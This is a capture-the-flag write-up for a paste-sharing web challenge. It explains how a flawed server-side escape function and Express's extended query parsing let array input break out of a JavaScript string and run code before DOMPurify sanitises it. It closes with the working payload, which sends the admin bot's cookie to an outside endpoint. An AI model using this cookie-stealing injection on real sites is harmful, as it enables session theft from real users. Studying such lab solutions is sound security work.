## Pasteurize
This was the introductory web challenge for the CTF.  

The webapp allows its users to create pastes and share them with "*TJMike*".  
This suggests that we have to exploit a client-side vulnerability and then use the share feature to send the payload to the bot.  

A comment in the HTML code of the page revealed the presence of an endpoint showing the sources of the NodeJS application at */source*.  

### DOMPurify and the custom escape function
Upon inspection of the code I saw that the user input was sanitized using [DOMPurify](https://github.com/cure53/DOMPurify) on the browser and through some strange function in Node.  
        const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1).replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
The function looked sketchy:
- It makes a JSON string
- Then it slices the first and last character
- Finally it HTML-encodes the **<** and **>** characters through a regex **globally**

When given a normal string as input, the slice function will just remove the quotation marks added by *JSON.stringify*.  

### Bypass using JSON Nested Objects
While reading more of the source I noticed this piece of code  
        app.use(bodyParser.urlencoded({
            extended: true
        }));

It's important because when **extended** is set to **true** *Express* will use [qs](https://www.npmjs.com/package/qs) instead of [query-string](https://www.npmjs.com/package/query-string) to parse the parameters, allowing us to use **JSON Nested Objects**.  

This means that if an object (or an array) was to pass through *JSON.stringify* it would be wrapped in parenthesis, defying the **slice** "protection" and allowing us to inject quotation marks in the Javascript ran on the page!  

As an example, `["abc","bcd"]` would become `"abc","bcd"`.  
This means that when the page is rendered the *quotation marks* will close those used to save the user input in a *const*.  
Now we can execute whatever code we want before **DOMPurify**'s *sanitize* function is called!  

![Example using alert(1)]()  

Now we just share the paste with *TJMike* to get their cookie and send it to an endpoint controlled by us and there's the flag!  

![Flag]()  

The payload I used in the *POST* request during the competition is the following:  
`content=;eval(window.location.href='https://myendpoint.com?flag='.concat(document.cookie));//&content`  

It basically creates an array and then comments the broken Javascript following the injection.  

